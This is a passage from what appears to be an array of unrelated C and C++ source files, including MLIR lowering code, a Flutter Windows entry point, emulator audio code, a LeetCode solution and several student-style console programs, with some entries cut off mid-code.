rewriter.create<mlir::arith::ConstantIndexOp>(loc, 0);\n      auto upperBound =\n          rewriter.create<mlir::arith::ConstantIndexOp>(loc, memRefShape[i]);\n      auto step = rewriter.create<mlir::arith::ConstantIndexOp>(loc, 1);\n      auto loop =\n          rewriter.create<mlir::scf::ForOp>(loc, lowerBound, upperBound, step);\n      for (mlir::Operation &nested : *loop.getBody()) {\n        rewriter.eraseOp(&nested);\n      }\n      loopIvs.push_back(loop.getInductionVar());\n\n      // Terminate the loop body.\n      rewriter.setInsertionPointToEnd(loop.getBody());\n\n      // Insert a newline after each of the inner dimensions of the shape.\n      if (i != e - 1) {\n        rewriter.create<mlir::LLVM::CallOp>(loc, getPrintfType(context),\n                                            printfRef, newLineCst);\n      }\n      rewriter.create<mlir::scf::YieldOp>(loc);\n      rewriter.setInsertionPointToStart(loop.getBody());\n    }\n\n    // Generate a call to printf for the current element of the loop.\n    auto printOp = mlir::cast<hello::PrintOp>(op);\n    auto elementLoad =\n        rewriter.create<mlir::memref::LoadOp>(loc, printOp.getInput(), loopIvs);\n    rewriter.create<mlir::LLVM::CallOp>(\n        loc, getPrintfType(context), printfRef,\n        mlir::ArrayRef<mlir::Value>({formatSpecifierCst, elementLoad}));\n\n    // Notify the rewriter that this operation has been removed.\n    rewriter.eraseOp(op);\n    return mlir::success();\n  }\n\nprivate:\n  static mlir::LLVM::LLVMFunctionType\n  getPrintfType(mlir::MLIRContext *context) {\n    auto llvmI32Ty = mlir::IntegerType::get(context, 32);\n    auto llvmPtrTy = mlir::LLVM::LLVMPointerType::get(context);\n    auto llvmFnType = mlir::LLVM::LLVMFunctionType::get(llvmI32Ty, llvmPtrTy,\n                                                        /*isVarArg=*/true);",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"day2\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// SPDX-FileCopyrightText: Copyright 2022 yuzu Emulator Project & 2025 citron Homebrew Project\n// SPDX-License-Identifier: GPL-2.0-or-later\n\n#include \"audio_core/audio_in_manager.h\"\n#include \"audio_core/in/audio_in.h\"\n#include \"core/hle/kernel/k_event.h\"\n\nnamespace AudioCore::AudioIn {\n\nIn::In(Core::System& system_, Manager& manager_, Kernel::KEvent* event_, size_t session_id_)\n    : manager{manager_}, parent_mutex{manager.mutex}, event{event_}, system{system_, event,\n                                                                            session_id_} {}\n\nvoid In::Free() {\n    std::scoped_lock l{parent_mutex};\n    manager.ReleaseSessionId(system.GetSessionId());\n}\n\nSystem& In::GetSystem() {\n    return system;\n}\n\nAudioIn::State In::GetState() {\n    std::scoped_lock l{parent_mutex};\n    return system.GetState();\n}\n\nResult In::StartSystem() {\n    std::scoped_lock l{parent_mutex};\n    return system.Start();\n}\n\nvoid In::StartSession() {\n    std::scoped_lock l{parent_mutex};\n    system.StartSession();\n}\n\nResult In::StopSystem() {\n    std::scoped_lock l{parent_mutex};\n    return system.Stop();\n}\n\nResult In::AppendBuffer(const AudioInBuffer& buffer, u64 tag) {\n    std::scoped_lock l{parent_mutex};\n\n    if (system.AppendBuffer(buffer, tag)) {\n        return ResultSuccess;\n    }\n    return Service::Audio::ResultBufferCountReached;\n}\n\nvoid In::ReleaseAndRegisterBuffers() {\n    std::scoped_lock l{parent_mutex};\n    if (system.GetState() == State::Started) {\n        system.ReleaseBuffers();\n        system.RegisterBuffers();\n    }\n}\n\nbool In::FlushAudioInBuffers() {\n    std::scoped_lock l{parent_mutex};\n    return system.FlushAudioInBuffers();\n}\n\nu32 In::GetReleasedBuffers(std::span<u64> tags) {\n    std::scoped_lock l{parent_mutex};\n    return system.GetReleasedBuffers(tags);\n}\n\nKernel::KReadableEvent& In::GetBufferEvent() {\n    std::scoped_lock l{parent_mutex};\n    return event->GetReadableEvent();\n}\n\nf32 In::GetVolume() const {\n    std::scoped_lock l{parent_mutex};\n    return system.GetVolume();\n}\n\nvoid In::SetVolume(f32 volume) {\n    std::scoped_lock l{parent_mutex};\n    system.SetVolume(volume);\n}\n\nbool In::ContainsAudioBuffer(u64 tag) const {\n    std::scoped_lock l{parent_mutex};\n    return system.ContainsAudioBuffer(tag);\n}\n\nu32 In::GetBufferCount() const {\n    std::scoped_lock l{parent_mutex};\n    return system.GetBufferCount();\n}\n\nu64 In::GetPlayedSampleCount() const {\n    std::scoped_lock l{parent_mutex};\n    return system.GetPlayedSampleCount();\n}\n\n} // namespace AudioCore::AudioIn\n",
    "#include \"smbios_parser.hpp\"\r\n#include <iostream>\r\n\r\nint main() {\r\n    try {\r\n        SMBIOSParser parser;\r\n        parser.loadData();\r\n\r\n        std::string command;\r\n        while (true) {\r\n            std::cout << \"> \";\r\n            std::cin >> command;\r\n\r\n            if (command == \"cmds\") {\r\n                parser.displayCommands();\r\n            }\r\n            else if (command == \"table\") {\r\n                parser.displaySMBIOSTable();\r\n            }\r\n            else if (command == \"all\") {\r\n                parser.displayAllStructures();\r\n            }\r\n            else if (command == \"quit\") {\r\n                break;\r\n            }\r\n            else {\r\n                try {\r\n                    uint16_t id = std::stoi(command);\r\n                    parser.displayStructureByID(id);\r\n                }\r\n                catch (...) {\r\n                    std::cout << \"Invalid command or ID.\\n\";\r\n                }\r\n            }\r\n        }\r\n    }\r\n    catch (const std::exception& e) {\r\n        std::cerr << \"Error: \" << e.what() << \"\\n\";\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"book.h\"\n\nextern bool valid;\n\nstd::vector<std::string> Split(const std::string &);\n\nstd::vector<std::string> inner_Split(const std::string &);\n\nint getType(const std::string &str);\n\nBook_Operation::Book_Operation():\n    Head(\"NodeHead_for_books\"),\n    Body(\"NodeBody_for_books\") {\n    initialise();\n    book_stack.clear();\n    current_Book.Quantity = -1;\n}\n\nBook_Operation::~Book_Operation() {\n    flush();\n}\n\nvoid Book_Operation::initialise() {\n    fstream file_;\n    //file_.open(\"Host_for_Books\", std::ios::in|std::ios::out);\n    //if (!file_.is_open()) {\n        file_.open(\"Host_for_Books\", std::ios::out);\n        file_.close();\n        file_.open(\"Host_for_Books\", std::ios::in|std::ios::out|std::ios::binary);\n        Head.new_id = -1;\n        Head.cur_size = 0;\n        Head.head = -1;\n        file_.write(reinterpret_cast<char*>(&Head.new_id), sizeof(int));\n        file_.write(reinterpret_cast<char*>(&Head.cur_size), sizeof(int));\n        file_.write(reinterpret_cast<char*>(&Head.head), sizeof(int));\n    //}\n    /*else {\n        file_.read(reinterpret_cast<char*>(&Head.new_id), sizeof(int));\n        file_.read(reinterpret_cast<char*>(&Head.cur_size), sizeof(int));\n        file_.read(reinterpret_cast<char*>(&Head.head), sizeof(int));\n        int p = Head.head;\n        while (p != -1) {\n            link_[p] = Head.visitHead(p);\n            p = link_[p].nex_head;\n        }\n    }*/\n    file_.close();\n    bloc_ = new Book[block_size_ + 3];\n}\n\nvoid Book_Operation::flush() {\n    fstream file_;\n    file_.open(\"Host_for_Books\", std::ios::in|std::ios::out|std::ios::binary);\n    file_.seekp(0);\n    file_.write(reinterpret_cast<char*>(&Head.new_id), sizeof(int));\n    file_.write(reinterpret_cast<char*>(&Head.cur_size), sizeof(int));\n    file_.write(reinterpret_cast<char*>(&Head.head), sizeof(int));\n    file_.close();\n    int p = Head.head;\n    while (p != -1) {\n        Head.writeHead(p, link_[p]);\n        p = link_[p].nex_head;\n    }\n\n    delete[] bloc_;\n}\n\nvoid Book_Operation::addNode(int index, Book data) {\n    int cursor = index / block_size_;\n    int cur_size = NodeHead_for_Books::getBlockSize(cursor);\n    Book ret;\n\n    int l = 0, r = cur_size - 1, mid;\n    while (l <= r) {\n        mid = (l + r) / 2;\n        ret = bloc_[mid];\n        int val = string_cmp(data.ISBN, ret.ISBN, data.ISBN_len, ret.ISBN_len);\n        if (val == 0) {\n            return;\n        }\n        if (val == -1) {\n            r = mid - 1;\n        }\n        else {\n            l = mid + 1;\n        }\n    }\n    int insert_place = l;\n\n    for (int i = cur_size - 1; i >= insert_place; i--) {\n        bloc_[i + 1] = bloc_[i];\n    }\n    bloc_[insert_place] = data;\n    cur_size++;\n    link_[cursor].size = cur_size;\n}\n\nvoid Book_Operation::deleteNode(int index) {\n    int cur_head = index / block_size_ * block_size_;\n    int cursor = cur_head / block_size_;\n    for (int i = index + 1; i < cur_head + link_[cursor].size; i++) {\n        bloc_[i - 1 - cur_head] = bloc_[i - cur_head];\n    }\n    link_[cursor].size--;\n}\n\nvoid Book_Operation::Select(const std::string &ISBN) {\n    if (ISBN.size() > 20) {\n        std::cout << \"Invalid\\n\";\n        return;\n    }\n    for (int i = 0; i < ISBN.size(); i++) {\n        if (!isgraph(ISBN[i])) {\n            std::cout << \"Invalid\\n\";\n            return;\n        }\n    }\n    Book ret = getBook(ISBN);\n    if (ret.Quantity == -1) {\n        Insert(ISBN);\n        ret = getBook(ISBN);\n    }\n    current_Book = ret;\n    book_stack.pop_back();\n    book_stack.push_back(ret);\n}\n\ndouble Book_Operation::Buy(const std::string &ISBN, int Quantity) {\n    Book data;\n    if (ISBN.size() > 20) {\n        std::cout << \"Invalid\\n\";\n        valid = false;\n        return -1;\n    }\n    for (int i = 0; i < ISBN.size(); i++) {\n        if (!isgraph(ISBN[i])) {\n            std::cout << \"Invalid\\n\";\n            valid = false;\n            return -1;\n        }\n    }\n    std::strcpy(data.ISBN, ISBN.c_str());\n    data.ISBN_len = static_cast<int>(ISBN.size());\n    int p = Head.head;\n    while (p != -1) {\n        int size = link_[p].size;\n        if (size <= 0) continue;\n        Body.visitNode(p * block_size_);\n        if (string_cmp(data.ISBN, bloc_[0].ISBN, data.ISBN_len, bloc_[0].ISBN_len) != -1 &&\n            string_cmp(data.ISBN, bloc_[size - 1].ISBN, data.ISBN_len, bloc_[size - 1].ISBN_len) != 1) {\n            int l = 0, r = size - 1, mid;\n            while (l <= r) {\n                mid = (l + r) / 2;\n                int val = string_cmp(data.ISBN, bloc_[mid].ISBN, data.ISBN_len, bloc_[mid].ISBN_len);\n                if (val == 0) {\n                    if (bloc_[mid].Quantity < Quantity) {\n                        return -1;\n                    }\n                    bloc_[mid].Quantity -= Quantity;\n                    printf(\"%.2lf\\n\", bloc_[mid].price * Quantity);\n                    Body.writeNode(p * block_size_);\n                    return bloc_[mid].price * Quantity;\n                }\n                if (val == -1) {\n                    r = mid - ",
    "/*\n * 916. Word Subsets\n *\n * You are given two string arrays words1 and words2.\n * A string b is a subset of string a if every letter in b occurs in a including multiplicity.\n * For example, \"wrr\" is a subset of \"warrior\" but is not a subset of \"world\".\n * A string a from words1 is universal if for every string b in words2, b is a subset of a.\n * Return an array of all the universal strings in words1. You may return the answer in any order.\n *\n * Example 1:\n * Input: words1 = [\"amazon\",\"apple\",\"facebook\",\"google\",\"leetcode\"], words2 = [\"e\",\"o\"]\n * Output: [\"facebook\",\"google\",\"leetcode\"]\n *\n * Example 2:\n * Input: words1 = [\"amazon\",\"apple\",\"facebook\",\"google\",\"leetcode\"], words2 = [\"l\",\"e\"]\n * Output: [\"apple\",\"google\",\"leetcode\"]\n *\n * Constraints:\n * 1 <= words1.length, words2.length <= 10^4\n * 1 <= words1[i].length, words2[i].length <= 10\n * words1[i] and words2[i] consist only of lowercase English letters.\n * All the strings of words1 are unique.\n */\n\n// Approach: Create a frequency array for maximum required occurrences from words2, then check each word in words1 if it satisfies these requirements.\n// T.C : O(n*l1 + m*l2) where n,m = size of words1,words2 & l1,l2 = avg length of words in words1,words2 respectively\n// S.C O(1) as we only use fixed-size vectors of size 26 for character frequencies.\nclass Solution {\npublic:\n   // Helper function to check if freq2 (combined frequencies of words2) is a subset of temp (frequency of current word1)\n   bool isSubset(vector<int>& freq2, vector<int>& temp){\n      // Check for each character if the required frequency is available in word1\n      for (int i = 0; i < 26; i++) {\n         if (temp[i] < freq2[i]) {\n            return false;\n         }\n      }\n      return true;\n   }\n\n   vector<string> wordSubsets(vector<string>& words1, vector<string>& words2){\n      vector<string> result;\n\n      // Store the maximum frequency required for each character from words2\n      vector<int> freq2(26);\n\n      for (string&word : words2) {\n         // Temporary vector to store frequency of current word\n         vector<int> temp(26, 0);\n\n         // Calculate frequency of each character in current word\n         for (char&ch : word) {\n            temp[ch - 'a']++;\n            // Update the maximum frequency required for each character\n            freq2[ch - 'a'] = max(freq2[ch - 'a'], temp[ch - 'a']);\n         }\n      }\n\n      // Check each word in words1 if it contains required frequencies\n      for (string&word: words1) {\n         // Calculate frequency of characters in current word\n         vector<int> temp(26, 0);\n         for (char&ch : word) {\n            temp[ch - 'a']++;\n         }\n\n         // If current word has all required characters with sufficient frequency, add to result\n         if (isSubset(freq2, temp)) {\n            result.push_back(word);\n         }\n      }\n\n      return result;\n   }\n};\n",
    "#define _CRT_SECURE_NO_WARNINGS\r\n#include <iostream>\r\n#include <string>\r\n#include <cstring>\r\n#include <chrono>\r\n#include <fstream>\r\n#include <unordered_map>\r\n\r\nusing namespace std;\r\nconst int Size = 50;\r\nstring token[Size] = {};\r\nstring userInput;\r\nstring foundedVar[Size] = {};\r\nbool Check = true;\r\nstring userEdt;\r\n\r\nbool message = false;\r\nbool Founded = false;\r\nbool Counter = false;\r\n\r\n// Variables\r\nint countAND = 0;\r\nint countOR = 0;\r\nint countNOT = 0;\r\nint countXOR = 0;\r\nint countNAND = 0;\r\nint countNOR = 0;\r\n\r\n// Path profiling data\r\nunordered_map<string, int> pathCount;\r\nunordered_map<string, chrono::microseconds> pathExecutionTimes;\r\n\r\n// Logging and profiling\r\nofstream logFile(\"event_log.txt\");\r\nchrono::steady_clock::time_point startTime;\r\n\r\nvoid logEvent(const string& event) {\r\n    logFile << \"[LOG] \" << event << endl;\r\n}\r\n\r\nvoid startExecutionTimer() {\r\n    startTime = chrono::steady_clock::now();\r\n    logEvent(\"Execution started.\");\r\n}\r\n\r\nvoid endExecutionTimer() {\r\n    auto endTime = chrono::steady_clock::now();\r\n    auto duration = chrono::duration_cast<chrono::milliseconds>(endTime - startTime).count();\r\n    logEvent(\"Execution completed in \" + to_string(duration) + \" ms.\");\r\n    cout << \"Execution Time: \" << duration << \" ms\" << endl;\r\n}\r\n\r\nvoid logGateUsage() {\r\n    logEvent(\"Gate Usage Summary:\");\r\n    logEvent(\"AND gates used: \" + to_string(countAND));\r\n    logEvent(\"OR gates used: \" + to_string(countOR));\r\n    logEvent(\"NOT gates used: \" + to_string(countNOT));\r\n    logEvent(\"XOR gates used: \" + to_string(countXOR));\r\n    logEvent(\"NAND gates used: \" + to_string(countNAND));\r\n    logEvent(\"NOR gates used: \" + to_string(countNOR));\r\n}\r\n\r\nvoid recordPathStart(const string& path) {\r\n    pathCount[path]++;\r\n    logEvent(\"Path started: \" + path);\r\n}\r\n\r\nvoid recordPathEnd(const string& path, chrono::steady_clock::time_point startTime) {\r\n    auto endTime = chrono::steady_clock::now();\r\n    auto duration = chrono::duration_cast<chrono::microseconds>(endTime - startTime);\r\n    pathExecutionTimes[path] += duration;\r\n    logEvent(\"Path ended: \" + path + \" Duration: \" + to_string(duration.count()) + \" microseconds\");\r\n}\r\n\r\nvoid displayPathProfile() {\r\n    logEvent(\"Path Profile Analysis:\");\r\n    logFile << \"--------------------------------------------------\\n\";\r\n    logFile << \"| Gate Type | Count | Execution Time (us)       |\\n\";\r\n    logFile << \"--------------------------------------------------\\n\";\r\n\r\n    for (const auto& entry : pathCount) {\r\n        auto duration = pathExecutionTimes[entry.first].count();\r\n        logFile << \"| \" << entry.first << \" | \" << entry.second << \"     | \" << duration << \" us             |\\n\";\r\n        logEvent(\"Path: \" + entry.first + \" Count: \" + to_string(entry.second) + \" Total Execution Time: \" + to_string(duration) + \" us\");\r\n        cout << \"Path: \" << entry.first << \" Count: \" << entry.second << \" Total Execution Time: \" << duration << \" us\" << endl;\r\n    }\r\n\r\n    logFile << \"--------------------------------------------------\\n\";\r\n}\r\n\r\n\r\nstring andlogic(string a, string b) {\r\n    auto startTime = chrono::steady_clock::now();\r\n    recordPathStart(\"AND\");\r\n    int x = stoi(a);\r\n    int y = stoi(b);\r\n    int res = x * y;\r\n    countAND++;\r\n    auto endTime = chrono::steady_clock::now();\r\n    auto duration = chrono::duration_cast<chrono::microseconds>(endTime - startTime);\r\n    pathExecutionTimes[\"AND\"] += duration;\r\n    recordPathEnd(\"AND\", startTime);\r\n    return to_string(res);\r\n}\r\n\r\nstring orlogic(string a, string b) {\r\n    auto startTime = chrono::steady_clock::now();\r\n    recordPathStart(\"OR\");\r\n    int x = stoi(a);\r\n    int y = stoi(b);\r\n    countOR++;\r\n    auto endTime = chrono::steady_clock::now();\r\n    auto duration = chrono::duration_cast<chrono::microseconds>(endTime - startTime);\r\n    pathExecutionTimes[\"OR\"] += duration;\r\n    recordPathEnd(\"OR\", startTime);\r\n    return to_string(x + y > 0 ? 1 : 0);\r\n}\r\n\r\nstring nandlogic(string a, string b) {\r\n    auto startTime = chrono::steady_clock::now();\r\n    recordPathStart(\"NAND\");\r\n    int x = stoi(a);\r\n    int y = stoi(b);\r\n    countNAND++;\r\n    auto endTime = chrono::steady_clock::now();\r\n    auto duration = chrono::duration_cast<chrono::microseconds>(endTime - startTime);\r\n    pathExecutionTimes[\"NAND\"] += duration;\r\n    recordPathEnd(\"NAND\", startTime);\r\n    return to_string(!(x && y));\r\n}\r\n\r\nstring norlogic(string a, string b) {\r\n    auto startTime = chrono::steady_clock::now();\r\n    recordPathStart(\"NOR\");\r\n    int x = stoi(a);\r\n    int y = stoi(b);\r\n    countNOR++;\r\n    auto endTime = chrono::steady_clock::now();\r\n    auto duration = chrono::duration_cast<chrono::microseconds>(endTime - startTime);\r\n    pathExecutionTimes[\"NOR\"] += duration;\r\n    recordPathEnd(\"NOR\", startTime);\r\n    return to_string(!(x || y));\r\n}\r\n\r\nstring notlogic(string a) {\r\n    auto startTime = chrono::steady_clock::now();\r\n    recordPathStart(\"NOT\");\r\n    bool x = stoi(a);\r\n    countNOT++;\r\n    auto endTime = chrono::steady_clock::",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <ctype.h>\r\n\r\n/*...............................................................................................................................................................*/\r\n\r\nstruct HocVien\r\n{\r\n\tchar maHV[20];        // m\u1ed9t chu\u1ed7i k\u00fd t\u1ef1 (\u0111\u1ed9 d\u00e0i t\u1ed1i \u0111a l\u00e0 20) \u0111\u1ec3 l\u01b0u tr\u1eef m\u00e3 s\u1ed1 c\u1ee7a h\u1ecdc vi\u00ean.\r\n\tchar hoLot[30];       // m\u1ed9t chu\u1ed7i k\u00fd t\u1ef1 (\u0111\u1ed9 d\u00e0i t\u1ed1i \u0111a l\u00e0 30) \u0111\u1ec3 l\u01b0u tr\u1eef h\u1ecd v\u00e0 t\u00ean l\u00f3t c\u1ee7a h\u1ecdc vi\u00ean.\r\n\tchar ten[20];         // m\u1ed9t chu\u1ed7i k\u00fd t\u1ef1 (\u0111\u1ed9 d\u00e0i t\u1ed1i \u0111a l\u00e0 20) \u0111\u1ec3 l\u01b0u tr\u1eef t\u00ean c\u1ee7a h\u1ecdc vi\u00ean.\r\n\tchar ngaySinh[20];    // m\u1ed9t chu\u1ed7i k\u00fd t\u1ef1 (\u0111\u1ed9 d\u00e0i t\u1ed1i \u0111a l\u00e0 20) \u0111\u1ec3 l\u01b0u tr\u1eef ng\u00e0y th\u00e1ng n\u0103m sinh c\u1ee7a h\u1ecdc vi\u00ean.\r\n\tchar maLop[20];       // m\u1ed9t chu\u1ed7i k\u00fd t\u1ef1 (\u0111\u1ed9 d\u00e0i t\u1ed1i \u0111a l\u00e0 20) \u0111\u1ec3 l\u01b0u tr\u1eef m\u00e3 s\u1ed1 c\u1ee7a l\u1edbp h\u1ecdc m\u00e0 h\u1ecdc vi\u00ean \u0111ang h\u1ecdc.\r\n\tfloat diem;           // m\u1ed9t s\u1ed1 th\u1ef1c \u0111\u1ec3 l\u01b0u tr\u1eef \u0111i\u1ec3m trung b\u00ecnh c\u1ee7a h\u1ecdc vi\u00ean.\r\n\tstruct HocVien *next; // m\u1ed9t con tr\u1ecf ki\u1ec3u HocVien \u0111\u1ec3 l\u01b0u tr\u1eef \u0111\u1ecba ch\u1ec9 c\u1ee7a h\u1ecdc vi\u00ean ti\u1ebfp theo trong danh s\u00e1ch li\u00ean k\u1ebft.\r\n};\r\n\r\n/*...........................................................................................................*/\r\n\r\nstruct LopHoc\r\n{\r\n\tchar maLop[20];      // m\u1ed9t chu\u1ed7i k\u00fd t\u1ef1 (\u0111\u1ed9 d\u00e0i t\u1ed1i \u0111a l\u00e0 20) \u0111\u1ec3 l\u01b0u tr\u1eef m\u00e3 s\u1ed1 c\u1ee7a l\u1edbp h\u1ecdc.\r\n\tchar tenLop[50];     // m\u1ed9t chu\u1ed7i k\u00fd t\u1ef1 (\u0111\u1ed9 d\u00e0i t\u1ed1i \u0111a l\u00e0 50) \u0111\u1ec3 l\u01b0u tr\u1eef t\u00ean c\u1ee7a l\u1edbp h\u1ecdc.\r\n\tchar lichHoc[10];    // m\u1ed9t chu\u1ed7i k\u00fd t\u1ef1 (\u0111\u1ed9 d\u00e0i t\u1ed1i \u0111a l\u00e0 10) \u0111\u1ec3 l\u01b0u tr\u1eef l\u1ecbch h\u1ecdc c\u1ee7a l\u1edbp h\u1ecdc.\r\n\tint hocPhi;          // m\u1ed9t s\u1ed1 nguy\u00ean \u0111\u1ec3 l\u01b0u tr\u1eef h\u1ecdc ph\u00ed c\u1ee7a l\u1edbp h\u1ecdc.\r\n\tstruct LopHoc *next; // m\u1ed9t con tr\u1ecf ki\u1ec3u LopHoc \u0111\u1ec3 l\u01b0u tr\u1eef \u0111\u1ecba ch\u1ec9 c\u1ee7a l\u1edbp h\u1ecdc ti\u1ebfp theo trong danh s\u00e1ch li\u00ean k\u1ebft.\r\n};\r\n\r\n/*...........................................................................................................*/\r\n\r\n// C\u00e2u 2.\r\nvoid docLopHoc(LopHoc **danhSachLopHoc);\r\nvoid docHocVien(HocVien **danhSachHocVien, LopHoc *danhSachLopHoc);\r\n\r\n// C\u00e2u 3.\r\nvoid themHocVien(HocVien **danhSachHocVien, LopHoc *danhSachLopHoc);\r\n\r\n// C\u00e2u 4.\r\nvoid timKiemHocVien(HocVien *danhSachHocVien, LopHoc *danhSachLopHoc);\r\nvoid timkiemHV_TenLop(HocVien *danhSachHocVien, LopHoc *danhSachLopHoc);\r\nvoid timkiemHV_MaHV(HocVien *danhSachHocVien, char keyword[]);\r\nvoid timkiemHV_NamSinh(HocVien *danhSachHocVien, char keyword[]);\r\n\r\n// C\u00e2u 5.\r\nvoid inLopHoc(LopHoc *danhSachLopHoc);\r\nvoid inHocVien(HocVien *danhSachHocVien);\r\n\r\n// C\u00e2u 6.\r\nvoid inHocVienDiemCaoNhat(HocVien *danhSachHocVien);\r\n\r\n// C\u00e2u 7.\r\nvoid timHocVien_HocPhiCaoNhat(HocVien *danhSachHocVien, LopHoc *danhSachLopHoc);\r\n\r\n// C\u00e2u 8.\r\nvoid sapXepHocVienTheoMaLopVaDiem(HocVien **danhSachHocVien);\r\n\r\n// C\u00e2u 9.\r\nvoid inHocVienDiemKem(HocVien *danhSachHocVien);\r\nvoid swapHocVien(HocVien *p, HocVien *q);\r\n\r\n// C\u00e2u 10.\r\nvoid inDanhSachHocVienCoDiemTren8(HocVien *danhSachHocVien);\r\n\r\n// Th\u00eam l\u1edbp h\u1ecdc\r\nvoid themLopMoi(LopHoc **danhSachLopHoc);\r\n\r\n//B\u1ed5 tr\u1ee3\r\nint kiemTraNgayThang(char ngaySinh[]);\r\nvoid formatNgay(char ngaySinh[]);\r\nint kiemTraChuaSo(char *s);\r\nint demTu(char *s);\r\nvoid chuanHoa(char *str);\r\n\r\n/*...........................................................................................................*/\r\n\r\nint main()\r\n{\r\n\tLopHoc *danhSachLopHoc = NULL;   // m\u1ed9t con tr\u1ecf ki\u1ec3u LopHoc \u0111\u01b0\u1ee3c kh\u1edfi t\u1ea1o v\u1edbi gi\u00e1 tr\u1ecb NULL, \u0111\u1ec3 l\u01b0u tr\u1eef danh s\u00e1ch c\u00e1c l\u1edbp h\u1ecdc.\r\n\tHocVien *danhSachHocVien = NULL; // m\u1ed9t con tr\u1ecf ki\u1ec3u HocVien \u0111\u01b0\u1ee3c kh\u1edfi t\u1ea1o v\u1edbi gi\u00e1 tr\u1ecb NULL, \u0111\u1ec3 l\u01b0u tr\u1eef danh s\u00e1ch c\u00e1c h\u1ecdc vi\u00ean.\r\n\tint chon;                        // m\u1ed9t bi\u1ebfn ki\u1ec3u s\u1ed1 nguy\u00ean, s\u1ebd \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u0111\u1ec3 l\u1ef1a ch\u1ecdn c\u00e1c t\u00f9y ch\u1ecdn trong ch\u01b0\u01a1ng tr\u00ecnh.\r\n\tchar tieuChi[50];                // m\u1ed9t m\u1ea3ng k\u00fd t\u1ef1 (\u0111\u1ed9 d\u00e0i t\u1ed1i \u0111a l\u00e0 50), s\u1ebd \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u0111\u1ec3 nh\u1eadp th\u00f4ng tin v\u1ec1 ti\u00eau ch\u00ed t\u00ecm ki\u1ebfm.\r\n\tsystem(\"color A\");               // h\u00e0m system \u0111\u1ec3 thay \u0111\u1ed5i m\u00e0u n\u1ec1n c\u1ee7a c\u1eeda s\u1ed5 console th\u00e0nh m\u00e0u xanh l\u00e1 c\u00e2y.\r\n#define MAX 100                      // \u0110\u1ecbnh ngh\u0129a h\u1eb1ng s\u1ed1 MAX v\u1edbi gi\u00e1 tr\u1ecb l\u00e0 100.\r\n\r\n\t/*...........................................................................................................*/\r\n\r\n\tdo\r\n\t{\r\n\t\tsystem(\"cls\"); // H\u00e0m system(\"cls\") l\u00e0 m\u1ed9t l\u1ec7nh d\u00f9ng \u0111\u1ec3 x\u00f3a to\u00e0n b\u1ed9 n\u1ed9i dung c\u1ee7a c\u1eeda s\u1ed5 console hi\u1ec7n t\u1ea1i.\r\n\t\tprintf(\"\\n ======================== MENU ==========================\\n\");\r\n\t\tprintf(\"|1. Doc thong tin lop hoc tu file.                       |\\n\");\r\n\t\tprintf(\"|2. Doc thong tin hoc vien tu file.                      |\\n\");\r\n\t\tprintf(\"|3. Them hoc vien vao danh sach.                         |\\n\");\r\n\t\tprintf(\"|4. Them lop hoc moi vao danh sach.                      |\\n\");\r\n\t\tprintf(\"|5. Tim kiem hoc vien theo tieu chi:                     |\\n\");\r\n\t\tprintf(\"|\\t5.1 Tim kiem hoc vien theo tieu chi: ten lop.    |\\n\");\r\n\t\tprintf(\"|\\t5.2 Tim kiem hoc vien theo tieu chi: ma hoc vien.|\\n\");\r\n\t\tprintf(\"|\\t5.3 Tim kiem hoc vien theo tieu chi: nam sinh.   |\\n\");\r\n\t\tprintf(\"|6. In danh sach lop hoc.                                |\\n\");\r\n\t\tprintf(\"|7. In danh sach hoc vien.                               |\\n\");\r\n\t\tprintf(\"|8. Tim kiem hoc vien co diem cao nhat.                  |\\n\");\r\n\t\tprintf(\"|9. Tim hoc vien co hoc phi cao nhat.                    |\\n\");\r\n\t\tp",
    "#include \"generateAst.h\"\n\n#include <fstream>\n#include <iostream>\n#include <sstream>\n#include <string>\n#include <vector>\n\nvoid defineAst(std::string outputDir, std::string &&baseName,\n\t\t\t   std::initializer_list<std::string> types) {\n\t// Header files that contain information (bag of data) about the AST nodes\n\n\t// File writer\n\tstd::ofstream headerFile(outputDir + \"/\" + baseName + \".hpp\");\n\tif (!headerFile) {\n\t\tstd::cerr << \"Could not open file for writing\"\n\t\t\t\t  << \"\\n\";\n\t\treturn;\n\t}\n\n\t// Subclasses\n\t// E.g. Binary, Grouping, Literal, Unary\n\tstd::vector<std::string> subclasses;\n\tfor (const std::string &type : types) {\n\t\tstd::string className = type.substr(0, type.find(\":\") - 1);\n\t\t// Remove spaces after the class name, e.g. \"Unary   \" -> \"Unary\"\n\t\tclassName = className.substr(className.find_first_not_of(\" \"),\n\t\t\t\t\t\t\t\t\t className.find_last_not_of(\" \") + 1);\n\t\tsubclasses.push_back(className);\n\t}\n\n\t// Includes\n\theaderFile << \"#ifndef \" << baseName << \"_HPP\"\n\t\t\t   << \"\\n\";\n\theaderFile << \"#define \" << baseName << \"_HPP\"\n\t\t\t   << \"\\n\\n\";\n\theaderFile << \"#include \\\"Token.hpp\\\"\"\n\t\t\t   << \"\\n\";\n\theaderFile << \"#include \\\"Expr.hpp\\\"\"\n\t\t\t   << \"\\n\";\n\theaderFile << \"#include <memory>\"\n\t\t\t   << \"\\n\\n\";\n\n\t// Forward declarations\n\t// e.g. class Binary; class Grouping; class Literal; class Unary;\n\tfor (const std::string &subclassName 